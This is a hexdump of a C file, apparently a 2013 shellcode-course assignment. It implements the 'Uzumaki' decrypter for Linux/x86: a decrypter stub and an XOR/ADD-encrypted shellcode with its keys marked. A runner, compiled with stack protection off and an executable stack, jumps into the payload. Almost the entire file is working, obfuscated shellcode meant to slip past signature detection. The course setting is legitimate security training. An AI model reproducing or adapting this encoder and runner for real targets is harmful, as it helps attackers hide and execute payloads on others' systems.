00000000  2f 2a 0a 0a 20 20 20 55  7a 75 6d 61 6b 69 20 44  |/*..   Uzumaki D|
00000010  65 63 72 79 70 74 65 72  20 53 68 65 6c 6c 63 6f  |ecrypter Shellco|
00000020  64 65 20 2d 20 43 20 4c  61 6e 67 75 61 67 65 20  |de - C Language |
00000030  2d 20 4c 69 6e 75 78 2f  78 38 36 0a 20 20 20 43  |- Linux/x86.   C|
00000040  6f 70 79 72 69 67 68 74  20 28 43 29 20 32 30 31  |opyright (C) 201|
00000050  33 20 47 65 79 73 6c 61  6e 20 47 2e 20 42 65 6d  |3 Geyslan G. Bem|
00000060  2c 20 48 61 63 6b 69 6e  67 20 62 69 74 73 0a 0a  |, Hacking bits..|
00000070  20 20 20 68 74 74 70 3a  2f 2f 68 61 63 6b 69 6e  |   http://hackin|
00000080  67 62 69 74 73 2e 63 6f  6d 0a 20 20 20 67 65 79  |gbits.com.   gey|
00000090  73 6c 61 6e 40 67 6d 61  69 6c 2e 63 6f 6d 0a 0a  |slan@gmail.com..|
000000a0  20 20 20 54 68 69 73 20  70 72 6f 67 72 61 6d 20  |   This program |
000000b0  69 73 20 66 72 65 65 20  73 6f 66 74 77 61 72 65  |is free software|
000000c0  3a 20 79 6f 75 20 63 61  6e 20 72 65 64 69 73 74  |: you can redist|
000000d0  72 69 62 75 74 65 20 69  74 20 61 6e 64 2f 6f 72  |ribute it and/or|
000000e0  20 6d 6f 64 69 66 79 0a  20 20 20 69 74 20 75 6e  | modify.   it un|
000000f0  64 65 72 20 74 68 65 20  74 65 72 6d 73 20 6f 66  |der the terms of|
00000100  20 74 68 65 20 47 4e 55  20 47 65 6e 65 72 61 6c  | the GNU General|
00000110  20 50 75 62 6c 69 63 20  4c 69 63 65 6e 73 65 20  | Public License |
00000120  61 73 20 70 75 62 6c 69  73 68 65 64 20 62 79 0a  |as published by.|
00000130  20 20 20 74 68 65 20 46  72 65 65 20 53 6f 66 74  |   the Free Soft|
00000140  77 61 72 65 20 46 6f 75  6e 64 61 74 69 6f 6e 2c  |ware Foundation,|
00000150  20 65 69 74 68 65 72 20  76 65 72 73 69 6f 6e 20  | either version |
00000160  33 20 6f 66 20 74 68 65  20 4c 69 63 65 6e 73 65  |3 of the License|
00000170  2c 20 6f 72 0a 20 20 20  28 61 74 20 79 6f 75 72  |, or.   (at your|
00000180  20 6f 70 74 69 6f 6e 29  20 61 6e 79 20 6c 61 74  | option) any lat|
00000190  65 72 20 76 65 72 73 69  6f 6e 2e 0a 0a 20 20 20  |er version...   |
000001a0  54 68 69 73 20 70 72 6f  67 72 61 6d 20 69 73 20  |This program is |
000001b0  64 69 73 74 72 69 62 75  74 65 64 20 69 6e 20 74  |distributed in t|
000001c0  68 65 20 68 6f 70 65 20  74 68 61 74 20 69 74 20  |he hope that it |
000001d0  77 69 6c 6c 20 62 65 20  75 73 65 66 75 6c 2c 0a  |will be useful,.|
000001e0  20 20 20 62 75 74 20 57  49 54 48 4f 55 54 20 41  |   but WITHOUT A|
000001f0  4e 59 20 57 41 52 52 41  4e 54 59 3b 20 77 69 74  |NY WARRANTY; wit|
00000200  68 6f 75 74 20 65 76 65  6e 20 74 68 65 20 69 6d  |hout even the im|
00000210  70 6c 69 65 64 20 77 61  72 72 61 6e 74 79 20 6f  |plied warranty o|
00000220  66 0a 20 20 20 4d 45 52  43 48 41 4e 54 41 42 49  |f.   MERCHANTABI|
00000230  4c 49 54 59 20 6f 72 20  46 49 54 4e 45 53 53 20  |LITY or FITNESS |
00000240  46 4f 52 20 41 20 50 41  52 54 49 43 55 4c 41 52  |FOR A PARTICULAR|
00000250  20 50 55 52 50 4f 53 45  2e 20 20 53 65 65 20 74  | PURPOSE.  See t|
00000260  68 65 0a 20 20 20 47 4e  55 20 47 65 6e 65 72 61  |he.   GNU Genera|
00000270  6c 20 50 75 62 6c 69 63  20 4c 69 63 65 6e 73 65  |l Public License|
00000280  20 66 6f 72 20 6d 6f 72  65 20 64 65 74 61 69 6c  | for more detail|
00000290  73 2e 0a 0a 20 20 20 59  6f 75 20 73 68 6f 75 6c  |s...   You shoul|
000002a0  64 20 68 61 76 65 20 72  65 63 65 69 76 65 64 20  |d have received |
000002b0  61 20 63 6f 70 79 20 6f  66 20 74 68 65 20 47 4e  |a copy of the GN|
000002c0  55 20 47 65 6e 65 72 61  6c 20 50 75 62 6c 69 63  |U General Public|
000002d0  20 4c 69 63 65 6e 73 65  0a 20 20 20 61 6c 6f 6e  | License.   alon|
000002e0  67 20 77 69 74 68 20 74  68 69 73 20 70 72 6f 67  |g with this prog|
000002f0  72 61 6d 2e 20 20 49 66  20 6e 6f 74 2c 20 73 65  |ram.  If not, se|
00000300  65 20 3c 68 74 74 70 3a  2f 2f 77 77 77 2e 67 6e  |e <http://www.gn|
00000310  75 2e 6f 72 67 2f 6c 69  63 65 6e 73 65 73 2f 3e  |u.org/licenses/>|
00000320  2e 0a 0a 2a 2f 0a 0a 2f  2a 0a 0a 20 20 20 75 7a  |...*/../*..   uz|
00000330  75 6d 61 6b 69 5f 64 65  63 72 79 70 74 65 72 5f  |umaki_decrypter_|
00000340  73 68 65 6c 6c 63 6f 64  65 0a 0a 20 20 20 2a 20  |shellcode..   * |
00000350  64 65 63 72 79 70 74 65  72 20 68 61 73 20 32 39  |decrypter has 29|
00000360  20 62 79 74 65 73 20 28  74 68 65 20 66 69 6e 61  | bytes (the fina|
00000370  6c 20 61 6d 6f 75 6e 74  20 64 65 70 65 6e 64 73  |l amount depends|
00000380  20 6f 6e 20 74 68 65 20  73 68 65 6c 6c 63 6f 64  | on the shellcod|
00000390  65 20 6c 65 6e 67 74 68  29 0a 20 20 20 2a 20 69  |e length).   * i|
000003a0  74 20 64 65 63 72 79 70  74 73 20 74 68 65 20 75  |t decrypts the u|
000003b0  7a 75 6d 61 6b 69 20 63  69 70 68 65 72 2c 20 61  |zumaki cipher, a|
000003c0  20 63 75 73 74 6f 6d 20  73 74 72 65 61 6d 20 63  | custom stream c|
000003d0  69 70 68 65 72 20 61 6c  67 6f 72 69 74 68 6d 20  |ipher algorithm |
000003e0  28 20 28 58 4f 52 20 5b  73 74 61 74 69 63 5d 20  |( (XOR [static] |
000003f0  61 6e 64 20 58 4f 52 20  5b 70 73 65 75 64 6f 72  |and XOR [pseudor|
00000400  61 6e 64 6f 6d 5d 29 2c  20 41 44 44 20 5b 73 74  |andom]), ADD [st|
00000410  61 74 69 63 5d 20 29 0a  20 20 20 2a 20 74 6f 20  |atic] ).   * to |
00000420  65 6e 63 72 79 70 74 20  74 68 65 20 73 68 65 6c  |encrypt the shel|
00000430  6c 63 6f 64 65 20 75 73  65 20 74 68 65 20 55 7a  |lcode use the Uz|
00000440  75 6d 61 6b 69 20 43 72  79 70 74 65 72 20 3c 68  |umaki Crypter <h|
00000450  74 74 70 73 3a 2f 2f 67  69 74 68 75 62 2e 63 6f  |ttps://github.co|
00000460  6d 2f 67 65 79 73 6c 61  6e 2f 53 4c 41 45 2f 62  |m/geyslan/SLAE/b|
00000470  6c 6f 62 2f 6d 61 73 74  65 72 2f 37 74 68 2e 61  |lob/master/7th.a|
00000480  73 73 69 67 6e 6d 65 6e  74 2f 75 7a 75 6d 61 6b  |ssignment/uzumak|
00000490  69 5f 63 72 79 70 74 65  72 2e 70 79 3e 0a 20 20  |i_crypter.py>.  |
000004a0  20 2a 20 6e 75 6c 6c 2d  66 72 65 65 0a 0a 20 20  | * null-free..  |
000004b0  20 23 20 67 63 63 20 2d  6d 33 32 20 2d 66 6e 6f  | # gcc -m32 -fno|
000004c0  2d 73 74 61 63 6b 2d 70  72 6f 74 65 63 74 6f 72  |-stack-protector|
000004d0  20 2d 7a 20 65 78 65 63  73 74 61 63 6b 20 75 7a  | -z execstack uz|
000004e0  75 6d 61 6b 69 5f 64 65  63 72 79 70 74 65 72 5f  |umaki_decrypter_|
000004f0  73 68 65 6c 6c 63 6f 64  65 2e 63 20 2d 6f 20 75  |shellcode.c -o u|
00000500  7a 75 6d 61 6b 69 5f 64  65 63 72 79 70 74 65 72  |zumaki_decrypter|
00000510  5f 73 68 65 6c 6c 63 6f  64 65 0a 0a 20 20 20 54  |_shellcode..   T|
00000520  65 73 74 69 6e 67 0a 20  20 20 23 20 2e 2f 75 7a  |esting.   # ./uz|
00000530  75 6d 61 6b 69 5f 64 65  63 72 79 70 74 65 72 5f  |umaki_decrypter_|
00000540  73 68 65 6c 6c 63 6f 64  65 0a 0a 2a 2f 0a 0a 0a  |shellcode..*/...|
00000550  23 69 6e 63 6c 75 64 65  20 3c 73 74 64 69 6f 2e  |#include <stdio.|
00000560  68 3e 0a 23 69 6e 63 6c  75 64 65 20 3c 73 74 72  |h>.#include <str|
00000570  69 6e 67 2e 68 3e 0a 0a  75 6e 73 69 67 6e 65 64  |ing.h>..unsigned|
00000580  20 63 68 61 72 20 73 68  65 6c 6c 63 6f 64 65 5b  | char shellcode[|
00000590  5d 20 3d 20 5c 0a 0a 20  20 20 20 20 20 20 20 20  |] = \..         |
000005a0  20 20 20 20 20 2f 2f 20  53 68 65 6c 6c 63 6f 64  |     // Shellcod|
000005b0  65 20 44 65 63 72 79 70  74 65 72 0a 20 20 20 20  |e Decrypter.    |
000005c0  20 20 20 20 20 20 20 20  20 20 22 5c 78 32 39 5c  |          "\x29\|
000005d0  78 63 39 5c 78 37 34 5c  78 31 34 5c 78 35 65 5c  |xc9\x74\x14\x5e\|
000005e0  78 62 31 22 0a 20 20 20  20 20 20 20 20 20 20 20  |xb1".           |
000005f0  20 20 20 22 5c 78 31 34  22 20 20 2f 2f 20 3c 2d  |   "\x14"  // <-|
00000600  20 73 68 65 6c 6c 63 6f  64 65 20 6c 65 6e 67 74  | shellcode lengt|
00000610  68 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |h.              |
00000620  22 5c 78 34 36 5c 78 38  62 5c 78 30 36 5c 78 38  |"\x46\x8b\x06\x8|
00000630  33 5c 78 65 38 22 0a 20  20 20 20 20 20 20 20 20  |3\xe8".         |
00000640  20 20 20 20 20 22 5c 78  30 39 22 20 20 2f 2f 20  |     "\x09"  // |
00000650  3c 2d 20 41 44 44 20 6b  65 79 0a 20 20 20 20 20  |<- ADD key.     |
00000660  20 20 20 20 20 20 20 20  20 22 5c 78 33 34 22 0a  |         "\x34".|
00000670  20 20 20 20 20 20 20 20  20 20 20 20 20 20 22 5c  |              "\|
00000680  78 39 66 22 20 20 2f 2f  20 3c 2d 20 58 4f 52 20  |x9f"  // <- XOR |
00000690  6b 65 79 0a 20 20 20 20  20 20 20 20 20 20 20 20  |key.            |
000006a0  20 20 22 5c 78 33 32 5c  78 34 36 5c 78 66 66 5c  |  "\x32\x46\xff\|
000006b0  78 38 38 5c 78 30 36 5c  78 65 32 5c 78 66 31 5c  |x88\x06\xe2\xf1\|
000006c0  78 65 62 5c 78 30 35 5c  78 65 38 22 0a 20 20 20  |xeb\x05\xe8".   |
000006d0  20 20 20 20 20 20 20 20  20 20 20 22 5c 78 65 37  |           "\xe7|
000006e0  5c 78 66 66 5c 78 66 66  5c 78 66 66 22 0a 0a 20  |\xff\xff\xff".. |
000006f0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000700  43 72 79 70 74 65 64 20  53 68 65 6c 6c 63 6f 64  |Crypted Shellcod|
00000710  65 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |e.              |
00000720  22 5c 78 33 31 5c 78 37  30 5c 78 61 61 5c 78 39  |"\x31\x70\xaa\x9|
00000730  32 5c 78 64 37 5c 78 32  64 5c 78 63 65 5c 78 61  |2\xd7\x2d\xce\xa|
00000740  66 5c 78 65 31 5c 78 61  38 22 0a 20 20 20 20 20  |f\xe1\xa8".     |
00000750  20 20 20 20 20 20 20 20  20 22 5c 78 63 63 5c 78  |         "\xcc\x|
00000760  38 64 5c 78 61 38 5c 78  65 31 5c 78 64 62 5c 78  |8d\xa8\xe1\xdb\x|
00000770  39 64 5c 78 61 31 5c 78  38 31 5c 78 66 65 5c 78  |9d\xa1\x81\xfe\x|
00000780  62 61 22 0a 20 20 20 20  20 20 20 20 20 20 20 20  |ba".            |
00000790  20 20 22 5c 78 64 62 22  3b 0a 0a 0a 6d 61 69 6e  |  "\xdb";...main|
000007a0  20 28 29 0a 7b 0a 0a 20  20 20 20 2f 2f 20 57 68  | ().{..    // Wh|
000007b0  65 6e 20 63 6f 6e 74 61  69 6e 73 20 6e 75 6c 6c  |en contains null|
000007c0  20 62 79 74 65 73 2c 20  70 72 69 6e 74 66 20 77  | bytes, printf w|
000007d0  69 6c 6c 20 73 68 6f 77  20 61 20 77 72 6f 6e 67  |ill show a wrong|
000007e0  20 73 68 65 6c 6c 63 6f  64 65 20 6c 65 6e 67 74  | shellcode lengt|
000007f0  68 2e 0a 0a 20 20 20 20  70 72 69 6e 74 66 28 22  |h...    printf("|
00000800  53 68 65 6c 6c 63 6f 64  65 20 4c 65 6e 67 74 68  |Shellcode Length|
00000810  3a 20 20 25 64 5c 6e 22  2c 20 73 74 72 6c 65 6e  |:  %d\n", strlen|
00000820  28 73 68 65 6c 6c 63 6f  64 65 29 29 3b 0a 0a 20  |(shellcode));.. |
00000830  20 20 20 2f 2f 20 50 6f  6c 6c 75 74 65 73 20 61  |   // Pollutes a|
00000840  6c 6c 20 72 65 67 69 73  74 65 72 73 20 65 6e 73  |ll registers ens|
00000850  75 72 69 6e 67 20 74 68  61 74 20 74 68 65 20 73  |uring that the s|
00000860  68 65 6c 6c 63 6f 64 65  20 72 75 6e 73 20 69 6e  |hellcode runs in|
00000870  20 61 6e 79 20 63 69 72  63 75 6d 73 74 61 6e 63  | any circumstanc|
00000880  65 2e 0a 0a 20 20 20 20  5f 5f 61 73 6d 5f 5f 20  |e...    __asm__ |
00000890  28 22 6d 6f 76 6c 20 24  30 78 66 66 66 66 66 66  |("movl $0xffffff|
000008a0  66 66 2c 20 25 65 61 78  5c 6e 5c 74 22 0a 20 20  |ff, %eax\n\t".  |
000008b0  20 20 20 20 20 20 20 20  20 20 22 6d 6f 76 6c 20  |          "movl |
000008c0  25 65 61 78 2c 20 25 65  62 78 5c 6e 5c 74 22 0a  |%eax, %ebx\n\t".|
000008d0  20 20 20 20 20 20 20 20  20 20 20 20 22 6d 6f 76  |            "mov|
000008e0  6c 20 25 65 61 78 2c 20  25 65 63 78 5c 6e 5c 74  |l %eax, %ecx\n\t|
000008f0  22 0a 20 20 20 20 20 20  20 20 20 20 20 20 22 6d  |".            "m|
00000900  6f 76 6c 20 25 65 61 78  2c 20 25 65 64 78 5c 6e  |ovl %eax, %edx\n|
00000910  5c 74 22 0a 20 20 20 20  20 20 20 20 20 20 20 20  |\t".            |
00000920  22 6d 6f 76 6c 20 25 65  61 78 2c 20 25 65 73 69  |"movl %eax, %esi|
00000930  5c 6e 5c 74 22 0a 20 20  20 20 20 20 20 20 20 20  |\n\t".          |
00000940  20 20 22 6d 6f 76 6c 20  25 65 61 78 2c 20 25 65  |  "movl %eax, %e|
00000950  64 69 5c 6e 5c 74 22 0a  20 20 20 20 20 20 20 20  |di\n\t".        |
00000960  20 20 20 20 22 6d 6f 76  6c 20 25 65 61 78 2c 20  |    "movl %eax, |
00000970  25 65 62 70 5c 6e 5c 74  22 0a 0a 20 20 20 20 20  |%ebp\n\t"..     |
00000980  20 20 20 20 20 20 20 2f  2f 20 43 61 6c 6c 69 6e  |       // Callin|
00000990  67 20 74 68 65 20 73 68  65 6c 6c 63 6f 64 65 0a  |g the shellcode.|
000009a0  20 20 20 20 20 20 20 20  20 20 20 20 22 63 61 6c  |            "cal|
000009b0  6c 20 73 68 65 6c 6c 63  6f 64 65 22 29 3b 0a 0a  |l shellcode");..|
000009c0  7d                                                |}|
000009c1
